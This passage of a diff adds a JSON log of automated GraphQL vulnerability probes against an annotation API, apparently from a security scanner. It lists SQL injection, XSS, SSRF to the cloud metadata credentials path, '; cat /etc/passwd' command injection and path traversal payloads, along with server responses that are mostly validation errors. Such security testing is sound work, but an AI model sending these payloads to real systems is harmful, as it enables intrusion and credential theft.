+      "query": "\nquery {\n  Annotation(id: \"annotation:9\") {\n    id\n    typ # Should suggest 'type'\n    bod # Should suggest 'body'\n    annotatinType # Should suggest 'annotationType'\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.094,
+    "timestamp": "2025-09-29T08:19:04.736479Z",
+    "count": 82,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/typ]) : Field 'typ' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/bod]) : Field 'bod' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/annotatinType]) : Field 'annotatinType' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 7,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_1\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.088,
+    "timestamp": "2025-09-29T08:19:25.616604Z",
+    "count": 83,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_sql' OR '1'='1\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.084,
+    "timestamp": "2025-09-29T08:19:27.590926Z",
+    "count": 84,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_xss_id\", name: \"<script>alert('XSS')</script>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.099,
+    "timestamp": "2025-09-29T08:19:29.729816Z",
+    "count": 85,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'name'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 39
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_ssrf_id\", url: \"http://169.254.169.254/latest/meta-data/\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.098,
+    "timestamp": "2025-09-29T08:19:31.403812Z",
+    "count": 86,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'url'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 40
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_cmd_id\", description: \"; cat /etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.09,
+    "timestamp": "2025-09-29T08:19:33.376178Z",
+    "count": 87,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'description'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 39
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_path_id\", filepath: \"../../../etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.102,
+    "timestamp": "2025-09-29T08:19:36.436016Z",
+    "count": 88,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'filepath'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 40
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_html_id\", details: \"<h1>Important Notice</h1><p>Please <img src='x' onerror='alert(\\\\\\\"XSS\\\\\\\")'> read this carefully.</p>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.111,
+    "timestamp": "2025-09-29T08:19:38.339551Z",
+    "count": 89,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'details'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 40
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_deny_bypass_non_aliased\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.095,
+        "timestamp": "2025-09-29T08:19:40.938833Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.094,
+        "timestamp": "2025-09-29T08:19:41.032709Z",
+        "response_body": {
+          "data": {
+            "annotated": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 90,
+    "timestamp": "2025-09-29T08:19:41.032737Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.108,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery AliasAnnotation {\n  annotated: Annotation(id: \"annotation_deny_bypass_aliased\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.083,
+        "timestamp": "2025-09-29T08:19:42.911739Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.101,
+        "timestamp": "2025-09-29T08:19:43.013513Z",
+        "response_body": {
+          "data": {
+            "annotated": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 91,
+    "timestamp": "2025-09-29T08:19:43.013577Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.099,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_introspection_test\") {\n    id\n    __typename\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.084,
+    "timestamp": "2025-09-29T08:19:45.893812Z",
+    "count": 92,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_suggestion\") {\n    id\n    name_field\n    description_field\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.102,
+    "timestamp": "2025-09-29T08:19:48.427974Z",
+    "count": 93,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/name_field]) : Field 'name_field' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/description_field]) : Field 'description_field' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:1\") {\n    id\n    type\n    body\n    field\n    annotationType\n    by\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.105,
+    "timestamp": "2025-09-29T08:20:08.145989Z",
+    "count": 94,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:2' OR 1=1 --\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.09,
+    "timestamp": "2025-09-29T08:20:10.130162Z",
+    "count": 95,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:3\") {\n    id\n    body\n    field\n    annotationType\n    by\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.083,
+    "timestamp": "2025-09-29T08:20:12.313652Z",
+    "count": 96,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:4\") {\n    id\n    field\n    annotationType\n    by\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.09,
+    "timestamp": "2025-09-29T08:20:14.517798Z",
+    "count": 97,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:5\") {\n    id\n    field\n    annotationType\n    by\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.099,
+    "timestamp": "2025-09-29T08:20:16.370796Z",
+    "count": 98,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:6\") {\n    id\n    field\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.081,
+    "timestamp": "2025-09-29T08:20:19.178177Z",
+    "count": 99,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:7\") {\n    id\n    body\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.101,
+    "timestamp": "2025-09-29T08:20:21.360362Z",
+    "count": 100,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:8\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.095,
+        "timestamp": "2025-09-29T08:20:23.487485Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.085,
+        "timestamp": "2025-09-29T08:20:23.572360Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 101,
+    "timestamp": "2025-09-29T08:20:23.572393Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.095,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery FirstAnnotation {\n  Annotation(id: \"annotation:9\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.095,
+        "timestamp": "2025-09-29T08:20:25.500280Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.09,
+        "timestamp": "2025-09-29T08:20:25.591084Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 102,
+    "timestamp": "2025-09-29T08:20:25.591159Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.09,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  Annotation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.092,
+    "timestamp": "2025-09-29T08:20:27.280587Z",
+    "count": 103,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Annotation]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/types]) : Field 'types' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:10\") {\n    id\n    typ # Intentionally misspelled to elicit suggestions\n    bodi # Intentionally misspelled to elicit suggestions\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.084,
+    "timestamp": "2025-09-29T08:20:29.874804Z",
+    "count": 104,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/typ]) : Field 'typ' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/bodi]) : Field 'bodi' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"2b3fe6cc-7a8f-4fbe-b64d-950a43e8cb69\") {\n    id\n    type\n    body\n    field\n    annotationType\n    by\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.097,
+    "timestamp": "2025-09-29T08:42:23.398181Z",
+    "count": 105,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Annotation": {
+          "id": "2b3fe6cc-7a8f-4fbe-b64d-950a43e8cb69",
+          "type": "Annotation",
+          "body": "In my view, this should read: \"Active in the Protectorate Bohemia and Moravia.\"",
+          "field": "place",
+          "annotationType": null,
+          "by": "Michal Frankl"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"2b3fe6cc-7a8f-4fbe-b64d-950a43e8cb69' OR 1=1 --\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.096,
+    "timestamp": "2025-09-29T08:42:25.535310Z",
+    "count": 106,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_xss_test\", type: \"\\\"<script>alert('XSS')</script>\\\"\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.085,
+    "timestamp": "2025-09-29T08:42:27.569902Z",
+    "count": 107,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'type'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 41
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_ssrf_test\", body: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access\") {\n    id\n    body\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.107,
+    "timestamp": "2025-09-29T08:42:30.427548Z",
+    "count": 108,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'body'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 42
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_cmd_test\", type: \"; cat /etc/passwd\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.089,
+    "timestamp": "2025-09-29T08:42:32.164723Z",
+    "count": 109,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'type'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 41
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_path_test\", field: \"../../../etc/passwd\") {\n    id\n    field\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.1,
+    "timestamp": "2025-09-29T08:42:34.392721Z",
+    "count": 110,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'field'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 42
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_html_test\", body: \"<h1>Important Notice</h1><p>Please <img src='x' onerror='alert(\\\"HTML injection\\\")'> read this carefully.</p>\") {\n    id\n    body\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.091,
+    "timestamp": "2025-09-29T08:42:37.307697Z",
+    "count": 111,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'body'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 42
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"2b3fe6cc-7a8f-4fbe-b64d-950a43e8cb69\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.087,
+        "timestamp": "2025-09-29T08:42:39.505338Z",
+        "response_body": {
+          "data": {
+            "Annotation": {
+              "id": "2b3fe6cc-7a8f-4fbe-b64d-950a43e8cb69",
+              "type": "Annotation"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.081,
+        "timestamp": "2025-09-29T08:42:39.586502Z",
+        "response_body": {
+          "data": {
+            "annot": {
+              "id": "2b3fe6cc-7a8f-4fbe-b64d-950a43e8cb69",
+              "type": "Annotation"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 112,
+    "timestamp": "2025-09-29T08:42:39.586536Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.091,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery getAnnotation {\n  annot: Annotation(id: \"2b3fe6cc-7a8f-4fbe-b64d-950a43e8cb69\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.078,
+        "timestamp": "2025-09-29T08:42:41.687568Z",
+        "response_body": {
+          "data": {
+            "Annotation": {
+              "id": "2b3fe6cc-7a8f-4fbe-b64d-950a43e8cb69",
+              "type": "Annotation"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.088,
+        "timestamp": "2025-09-29T08:42:41.776668Z",
+        "response_body": {
+          "data": {
+            "annot": {
+              "id": "2b3fe6cc-7a8f-4fbe-b64d-950a43e8cb69",
+              "type": "Annotation"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 113,
+    "timestamp": "2025-09-29T08:42:41.776729Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.093,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  Annotation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.097,
+    "timestamp": "2025-09-29T08:42:43.626491Z",
+    "count": 114,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Annotation]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/types]) : Field 'types' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"2b3fe6cc-7a8f-4fbe-b64d-950a43e8cb69\") {\n    id\n    typ # Should suggest 'type'\n    bod # Should suggest 'body'\n    anotationType # Should suggest 'annotationType'\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.093,
+    "timestamp": "2025-09-29T08:42:46.360921Z",
+    "count": 115,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/typ]) : Field 'typ' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/bod]) : Field 'bod' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/anotationType]) : Field 'anotationType' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 7,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
